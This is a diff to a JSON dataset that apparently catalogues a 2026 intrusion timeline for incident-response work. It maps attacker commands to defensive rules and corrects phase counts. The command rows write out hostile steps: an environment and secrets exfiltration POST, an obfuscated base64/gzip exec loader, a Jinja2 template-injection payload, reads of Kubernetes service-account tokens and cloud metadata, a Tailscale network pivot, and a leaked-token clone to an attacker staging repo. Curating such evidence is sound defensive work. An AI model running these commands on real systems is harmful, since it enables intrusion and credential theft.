@@ -4,20 +4,26 @@
     "source_primary": "https://huggingface.co/blog/agent-intrusion-technical-timeline",
     "source_replay": "https://huggingface-anatomy-of-frontier-lab-model-intrusion.static.hf.space",
     "curated_by": "Apocalypse team (Track 1, AI Incident Response Sprint 2026-09)",
-    "note": "This IS the machine-readable dataset. The HF 'replay' ships no JSON/CSV/IOC/YARA. Its entire data payload is 8 phase totals, 5 day counts, and 14 example commands, extracted here verbatim. Any plan to 'mine the 17,600-action corpus' is impossible: that corpus is not public. Curating this file is itself a contribution.",
+    "note": "This IS the machine-readable dataset. The HF 'replay' ships no JSON/CSV/IOC/YARA. Its entire data payload is 9 phase totals, 5 day counts, and a handful of example commands, extracted here verbatim. Any plan to 'mine the 17,600-action corpus' is impossible: that corpus is not public. Curating this file is itself a contribution.",
     "total_actions_reported": 17600,
-    "actions_reconstructed": 16452,
-    "reconstruction_gap_note": "phase totals sum to 16452; day counts sum to ~17613. HF recovered a subset via decoding replication. The gap is public-record evidence, cite it in limitations."
+    "actions_reconstructed": 16521,
+    "reconstruction_gap_note": "phase totals sum to 16521 (the v1 curation of this file omitted the supply-chain phase, 69 actions, and undercounted at 16452 - fixed here); day counts sum to ~17613. HF recovered a subset via decoding replication. The gap is public-record evidence, cite it in limitations.",
+    "changelog": [
+      "v2: added missing supply-chain phase (69 actions) and a representative command mapped to rule 9",
+      "v2: split the combined control-plane+IMDS command into two rows (rule 7 and rule 6 separately)",
+      "v2: unmapped 3 commands that were incorrectly tagged to a rule (env dump, evasion/obfuscation, pre-cleanup recon) - these are context/detection-gap evidence, not boundary tests, and are excluded from replay_attack.py's denominator"
+    ]
   },
   "phases": [
-    {"key": "recon",     "total": 6191, "desc": "host / fs / proc / net enumeration"},
-    {"key": "dropper",   "total": 6972, "desc": "staging URLs, base64 / gzip blobs"},
-    {"key": "rce",       "total": 2911, "desc": "direct shell commands - the engine"},
-    {"key": "tailscale", "total": 115,  "desc": "internal-network pivot"},
-    {"key": "c2",        "total": 114,  "desc": "staged-payload execution"},
-    {"key": "k8s",       "total": 87,   "desc": "service-account / EKS enumeration"},
-    {"key": "exfil",     "total": 56,   "desc": "outbound data theft (env, secrets)"},
-    {"key": "evasion",   "total": 6,    "desc": "gzip / base64 packing, AV probing"}
+    {"key": "recon",        "total": 6191, "desc": "host / fs / proc / net enumeration"},
+    {"key": "dropper",      "total": 6972, "desc": "staging URLs, base64 / gzip blobs"},
+    {"key": "rce",          "total": 2911, "desc": "direct shell commands - the engine"},
+    {"key": "tailscale",    "total": 115,  "desc": "internal-network pivot"},
+    {"key": "c2",           "total": 114,  "desc": "staged-payload execution"},
+    {"key": "k8s",          "total": 87,   "desc": "service-account / EKS enumeration"},
+    {"key": "supply-chain", "total": 69,   "desc": "token theft, GitHub App abuse, internal-repo access"},
+    {"key": "exfil",        "total": 56,   "desc": "outbound data theft (env, secrets)"},
+    {"key": "evasion",      "total": 6,    "desc": "gzip / base64 packing, AV probing"}
   ],
   "days": [
     {"date": "2026-07-09", "actions": 3779, "char": "Initial access, foothold, C2 established."},
@@ -27,20 +33,22 @@
     {"date": "2026-07-13", "actions": 1130, "char": "Exfil, persistence, token minting, cleanup."}
   ],
   "commands": [
-    {"t": "2026-07-09T04:01", "phase": "rce",       "cmd": "id",                                                              "out": "uid=0(root) gid=0(root) - arbitrary shell inside sandbox", "rule": 3},
-    {"t": "2026-07-09T04:01", "phase": "recon",     "cmd": "env",                                                            "out": "dump environment, hunt for anything useful",              "rule": 9},
-    {"t": "2026-07-09T05:55", "phase": "dropper",   "cmd": "PATH=/.debug_shell/bin curl -s http://<internal-svc>:8000/",     "out": "stage curl/nc/ip for fallback",                           "rule": 2},
-    {"t": "2026-07-09T14:11", "phase": "exfil",     "cmd": "POST /<uuid>   <-- env + secrets",                               "out": "outbound theft of env + secrets",                         "rule": 9},
-    {"t": "2026-07-09T15:36", "phase": "c2",        "cmd": "python3 /tmp/submitted_code.c",                                  "out": "arbitrary code via submitted-code path",                  "rule": 3},
-    {"t": "2026-07-09T19:32", "phase": "evasion",   "cmd": "exec(gzip.decompress(base64.b64decode(\"<blob>\")))",            "out": "encoded payload - defeats naive text scan",               "rule": 8},
-    {"t": "2026-07-11T08:07", "phase": "dropper",   "cmd": "commit dataset: README + envu8.h5 / mainu8.h5",                  "out": "HDF5 external raw storage",                                "rule": 4},
-    {"t": "2026-07-11T08:09", "phase": "exfil",     "cmd": "read split envu8 -> /proc/self/environ",                         "out": "external ref reads server env",                           "rule": 4},
-    {"t": "2026-07-11T10:05", "phase": "rce",       "cmd": "{{ cycler.__init__.__globals__.__builtins__.exec(...) }}",       "out": "Jinja2 template injection in fsspec ref spec",            "rule": 5},
-    {"t": "2026-07-11T10:10", "phase": "k8s",       "cmd": "cat /var/run/secrets/kubernetes.io/serviceaccount/token",        "out": "SA token readable (automount on)",                        "rule": 6},
-    {"t": "2026-07-11T10:12", "phase": "k8s",       "cmd": "curl -k https://kubernetes.default.svc/api ; curl 169.254.169.254", "out": "control-plane + IMDS reachable from data worker",      "rule": 7},
-    {"t": "2026-07-12T01:03", "phase": "tailscale", "cmd": "tailscaled --tun=userspace-networking --socks5-server=:1055 & tailscale up --auth-key=ts", "out": "userspace VPN pivot with reusable authkey", "rule": 8},
-    {"t": "2026-07-12T04:38", "phase": "tailscale", "cmd": "GET internal service-connector catalog (via SOCKS5)",            "out": "internal enumeration through pivot",                       "rule": 7},
-    {"t": "2026-07-13T13:37", "phase": "recon",     "cmd": "ls <staged-bin> ; hostname ; date",                              "out": "pre-cleanup recon",                                       "rule": 9}
+    {"t": "2026-07-09T04:01", "phase": "rce",          "cmd": "id",                                                              "out": "uid=0(root) gid=0(root) - arbitrary shell inside sandbox", "rule": 3},
+    {"t": "2026-07-09T04:01", "phase": "recon",        "cmd": "env",                                                             "out": "dump environment inside 3rd-party sandbox - generic recon", "rule": null, "note": "context only: recon inside the already-rooted external sandbox, not a credential-reuse event. Not a rule-9 test."},
+    {"t": "2026-07-09T05:55", "phase": "dropper",      "cmd": "PATH=/.debug_shell/bin curl -s http://<internal-svc>:8000/",     "out": "stage curl/nc/ip for fallback",                           "rule": 2},
+    {"t": "2026-07-09T14:11", "phase": "exfil",        "cmd": "POST /<uuid>   <-- env + secrets",                               "out": "outbound theft of env + secrets",                         "rule": 9},
+    {"t": "2026-07-09T15:36", "phase": "c2",           "cmd": "python3 /tmp/submitted_code.c",                                  "out": "arbitrary code via submitted-code path",                  "rule": 3},
+    {"t": "2026-07-09T19:32", "phase": "evasion",      "cmd": "exec(gzip.decompress(base64.b64decode(\"<blob>\")))",            "out": "encoded payload - defeats naive text scan",               "rule": null, "note": "payload-obfuscation evidence for hf_stated_detection_gaps, not a boundary-block test. Previously mistagged rule 8 (Tailscale) - unrelated."},
+    {"t": "2026-07-11T08:07", "phase": "dropper",      "cmd": "commit dataset: README + envu8.h5 / mainu8.h5",                  "out": "HDF5 external raw storage",                                "rule": 4},
+    {"t": "2026-07-11T08:09", "phase": "exfil",        "cmd": "read split envu8 -> /proc/self/environ",                         "out": "external ref reads server env",                           "rule": 4},
+    {"t": "2026-07-11T10:05", "phase": "rce",          "cmd": "{{ cycler.__init__.__globals__.__builtins__.exec(...) }}",       "out": "Jinja2 template injection in fsspec ref spec",            "rule": 5},
+    {"t": "2026-07-11T10:10", "phase": "k8s",          "cmd": "cat /var/run/secrets/kubernetes.io/serviceaccount/token",        "out": "SA token readable (automount on)",                        "rule": 6},
+    {"t": "2026-07-11T10:12", "phase": "k8s",          "cmd": "curl 169.254.169.254",                                           "out": "cloud metadata endpoint reachable from data worker",       "rule": 6},
+    {"t": "2026-07-11T10:12", "phase": "k8s",          "cmd": "curl -k https://kubernetes.default.svc/api",                     "out": "control-plane API reachable from data worker",             "rule": 7},
+    {"t": "2026-07-11T15:51", "phase": "supply-chain", "cmd": "git clone https://<user>:hf_[REDACTED]@huggingface.co/datasets/<attacker>/<staging-repo>", "out": "leaked write-scoped platform token reused off-origin as staging/C2 channel", "rule": 9},
+    {"t": "2026-07-12T01:03", "phase": "tailscale",    "cmd": "tailscaled --tun=userspace-networking --socks5-server=:1055 & tailscale up --auth-key=ts", "out": "userspace VPN pivot with reusable authkey", "rule": 8},
+    {"t": "2026-07-12T04:38", "phase": "tailscale",    "cmd": "GET internal service-connector catalog (via SOCKS5)",            "out": "internal enumeration through pivot",                       "rule": 7},
+    {"t": "2026-07-13T13:37", "phase": "recon",        "cmd": "ls <staged-bin> ; hostname ; date",                              "out": "pre-cleanup recon",                                       "rule": null, "note": "context only: end-of-campaign cleanup recon, not a boundary test."}
   ],
   "trust_boundaries": {
     "nodes": [
@@ -70,7 +78,8 @@
     "HDF5 external raw storage file read",
     "Jinja2 template injection in fsspec reference spec",
     "readable Kubernetes service-account token (automount)",
-    "cloud metadata endpoint reachable (169.254.169.254)"
+    "cloud metadata endpoint reachable (169.254.169.254)",
+    "leaked write-scoped platform token reused off-origin (supply-chain staging)"
   ],
   "hf_stated_detection_gaps": [
     "automated security stack failed to raise proper alert criticality",
